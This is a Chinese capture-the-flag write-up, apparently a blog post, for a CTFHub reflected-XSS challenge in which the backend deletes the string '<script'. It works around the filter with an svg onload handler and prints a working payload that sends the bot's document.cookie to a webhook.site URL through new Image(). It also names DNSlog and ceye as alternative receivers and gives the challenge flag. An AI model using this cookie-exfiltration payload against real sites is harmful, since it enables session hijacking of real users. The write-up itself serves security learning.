---
title: CTFHub XSS 过滤关键词
date: 2026-10-03
categories: CTFHub Web
tags: CTFHub Web
---
# 题目: CTFHub XSS 过滤关键词

## 题目描述
页面输入内容会直接反射输出到网页，后端会过滤 <script 关键词，直接删除该字符串，导致 <script> 标签无法使用。平台提供 Send URL to Bot 功能，Flag存放在Bot浏览器Cookie中，需要构造不含 <script 的XSS Payload，执行JS并外带Cookie获取flag。
 
## 解题思路
1. 测试基础payload  <script>alert(1)</script> ，发现 <script 被过滤删除，payload失效。
2. 绕过思路：放弃script标签，使用HTML事件标签执行JS，例如img的 onerror 、svg的 onload ，这类标签不需要script关键字。
3. 构造OOB外带Payload，利用 new Image() 发起GET请求，将Bot的Cookie拼入URL参数发送到webhook.site接收平台。
4. 将构造好的恶意链接提交给Bot，监听webhook的请求记录，从查询参数提取Cookie，拿到flag。
 
## 解题步骤
1. 漏洞验证
输入测试payload：
<script>alert(1)</script>
后端删除 <script 关键字，标签被破坏，无法执行JS，确认关键词过滤。

2. 构造Payload
测试弹窗payload：
<svg onload=alert(1)>

最终可用Payload
<svg onload="new Image().src='https://webhook.site/53595844-8e14-4c3f-89b4-bffe6625e4e2?c='+document.cookie">
踩坑：img+onerror payload在本题Bot环境触发不稳定，svg方案成功拿到flag。
 
3. 提交Payload，发送Bot
将Payload粘贴到靶场输入框提交，复制浏览器完整URL，粘贴至 Send URL to Bot 发送。

4. 获取Flag
刷新webhook.site，等待Bot请求，查看 Query strings 参数，提取flag：
ctfhub{cfce16e330902cfe52dc54e8}

## 踩坑指南
1. 禁止使用 <script> 相关标签，关键词会被后端直接删除，payload失效。
2. < img src=x onerror=...> 需要图片加载失败才触发事件，在部分Bot环境渲染异常，事件不触发，无法外带数据。
3. <svg onload> 标签渲染完成就执行JS，不需要加载外部资源，Bot场景稳定性更强，优先作为备选。
4. webhook.site为境外站点，Bot可能访问超时，可以备用DNSlog、ceye。
5. 注意引号匹配，onload内部单引号和外层双引号错开，防止JS提前闭合。
 
## 知识点总结
1. 关键词过滤：后端正则匹配删除指定字符串，属于简单WAF过滤。
2. 事件型XSS： onload 、 onerror 等HTML事件属性，不需要script标签即可执行JavaScript。

3. OOB外带： new Image() 创建图片对象发起GET请求，无CORS跨域限制，适合Bot题型窃取Cookie。

4. 绕过思路：被过滤的标签直接舍弃，更换其他支持事件的标签，不要硬写被拦截的关键字。
